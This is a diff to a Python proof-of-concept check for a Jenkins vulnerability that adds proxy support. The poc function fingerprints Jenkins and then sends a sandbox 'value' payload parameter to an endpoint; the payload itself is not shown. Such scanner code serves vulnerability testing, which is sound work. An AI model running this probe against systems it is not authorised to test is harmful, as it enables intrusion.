@@ -5,6 +5,8 @@ import requests
 import re
 import urllib
 import binascii
+
+from Config.config_proxies import proxies
 from Config.config_requests import headers
 
 requests.packages.urllib3.disable_warnings()
@@ -29,12 +31,12 @@ def poc(target):
             'sandbox': True,
             'value': payload
         }
-        req = requests.get(target, headers=headers, timeout=5)
+        req = requests.get(target, headers=headers, timeout=5,proxies=proxies)
         if re.search('Jenkins', str(req.headers)) and re.search('adjuncts', req.text) and req.status_code == 200:
             vurl = urllib.parse.urljoin(target, endpoint)
             rep2 = requests.get(vurl, headers=headers, timeout=5)
             if rep2.status_code != 404:
-                rep3 = requests.get(vurl, params=params, headers=headers, timeout=5)
+                rep3 = requests.get(vurl, params=params, headers=headers, timeout=5,proxies=proxies)
                 if rep3.status_code == 200:
                     result['target'] = target
                     result['poc'] = NAME
